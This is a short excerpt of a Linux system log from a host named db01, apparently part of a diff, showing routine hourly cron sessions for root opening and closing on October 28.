+Oct 28 20:09:01 db01 CRON[4427]: pam_unix(cron:session): session closed for user root
+Oct 28 21:09:00 db01 CRON[4453]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 21:09:01 db01 CRON[4453]: pam_unix(cron:session): session closed for user root
+Oct 28 22:09:00 db01 CRON[4485]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 22:09:01 db01 CRON[4485]: pam_unix(cron:session): session closed for user root
+Oct 28 23:09:00 db01 CRON[4508]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 28 23:09:01 db01 CRON[4508]: pam_unix(cron:session): session closed for user root
